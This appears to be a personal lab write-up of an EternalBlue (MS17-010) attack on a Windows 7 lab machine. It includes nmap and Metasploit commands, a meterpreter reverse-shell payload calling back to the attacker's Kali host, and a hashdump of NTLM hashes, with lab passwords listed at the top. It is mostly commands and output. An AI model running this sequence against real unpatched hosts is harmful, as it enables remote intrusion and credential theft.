
User: Password123!
Administrator: Password456!

IP Address of Kali: 192.168.64.4
IP Address of Blue Machine: 192.168.64.2

============================

### Do nmap scan

```
nmap -p- -A -T4 192.168.64.2
```

##### Result

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- -A -T4 192.168.64.2
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-17 14:44 PDT
Nmap scan report for 192.168.64.2
Host is up (0.0014s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  `
                 ]��      Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49156/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 56:87:7c:ea:a4:b3 (unknown)
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-17T17:46:46-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-06-17T21:46:46
|_  start_date: 2024-06-17T21:23:42

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.37 seconds

```

###### We see in nmap the SMB port 445/tcp is open and the OS is Windows 7 Ultimate 7601 Service Pack 1 in workgroup WORKGROUP

### Search Vulnerability for Windows 7 Ultimate 7601 Service Pack 1

- https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
	- The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer.
	- https://www.exploit-db.com/exploits/42315
-  **Search in metasploit**
```
msf6 > search eternalBlue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

##### We will use the  smb scanner option below if metasploit

3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection

Execute: `use 3`

```
msf6 > use 3
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                Required  Description
   ----         ---------------                                --------  -----------
   CHECK_ARCH   true                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
                s/named_pipes.txt
   RHOSTS                                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
                                                                         ng-metasploit.html
   RPORT        445                                            yes       The SMB service port (TCP)
   SMBDomain    .                                              no        The Windows domain to use for authentication
   SMBPass                                                     no        The password for the specified username
   SMBUser                                                     no        The username to authenticate as
   THREADS      1                                              yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.64.2
RHOSTS => 192.168.64.2
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
```


### Trying other module of EternalBlue

** 0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption**

**Summary of Commands**

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.64.2
RHOSTS => 192.168.64.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 192.168.64.2:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.64.2:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.64.2
RHOST => 192.168.64.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 192.168.64.2:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.64.2:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.64.2     yes       The target host(s), see https:
                                             //docs.metasploit.com/docs/usi
                                             ng-metasploit/basics/using-met
                                             asploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain
                                             to use for authentication. Onl
                                             y affects Windows Server 2008
                                             R2, Windows 7, Windows Embedde
                                             d Standard 7 target machines.
   SMBPass                         no        (Optional) The password for th
                                             e specified username
   SMBUser                         no        (Optional) The username to aut
                                             henticate as
   VERIFY_ARCH    true             yes       Check if remote architecture m
                                             atches exploit Target. Only af
                                             fects Windows Server 2008 R2,
                                             Windows 7, Windows Embedded St
                                             andard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exp
                                             loit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 t
                                             arget machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
                                        thread, process, none)
   LHOST     192.168.64.4     yes       The listen address (an interface ma
                                        y be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
LHOST => 192.168.64.4
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.64.4:4444 
[*] 192.168.64.2:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.64.2:445 - The target is vulnerable.
[*] 192.168.64.2:445 - Connecting to target for exploitation.
[+] 192.168.64.2:445 - Connection established for exploitation.
[+] 192.168.64.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.64.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.64.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.64.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.64.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.64.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.64.2:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.64.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.64.2:445 - Starting non-paged pool grooming
[+] 192.168.64.2:445 - Sending SMBv2 buffers
[+] 192.168.64.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.64.2:445 - Sending final SMBv2 buffers.
[*] 192.168.64.2:445 - Sending last fragment of exploit packet!
[*] 192.168.64.2:445 - Receiving response from exploit packet
[+] 192.168.64.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.64.2:445 - Sending egg to corrupted connection.
[*] 192.168.64.2:445 - Triggering free of corrupted buffer.
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.64.2:445 - Connecting to target for exploitation.
[+] 192.168.64.2:445 - Connection established for exploitation.
[+] 192.168.64.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.64.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.64.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.64.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.64.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.64.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.64.2:445 - Trying exploit with 17 Groom Allocations.
[*] 192.168.64.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.64.2:445 - Starting non-paged pool grooming
[+] 192.168.64.2:445 - Sending SMBv2 buffers
[+] 192.168.64.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.64.2:445 - Sending final SMBv2 buffers.
[*] 192.168.64.2:445 - Sending last fragment of exploit packet!
[*] 192.168.64.2:445 - Receiving response from exploit packet
[+] 192.168.64.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.64.2:445 - Sending egg to corrupted connection.
[*] 192.168.64.2:445 - Triggering free of corrupted buffer.
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.64.2:445 - Connecting to target for exploitation.
[+] 192.168.64.2:445 - Connection established for exploitation.
[+] 192.168.64.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.64.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.64.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.64.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.64.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.64.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.64.2:445 - Trying exploit with 22 Groom Allocations.
[*] 192.168.64.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.64.2:445 - Starting non-paged pool grooming
[+] 192.168.64.2:445 - Sending SMBv2 buffers
[+] 192.168.64.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.64.2:445 - Sending final SMBv2 buffers.
[*] 192.168.64.2:445 - Sending last fragment of exploit packet!
[*] 192.168.64.2:445 - Receiving response from exploit packet
[+] 192.168.64.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.64.2:445 - Sending egg to corrupted connection.
[*] 192.168.64.2:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.64.2
[*] Meterpreter session 1 opened (192.168.64.4:4444 -> 192.168.64.2:49160) at 2024-06-17 16:40:13 -0700
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
meterpreter > 

```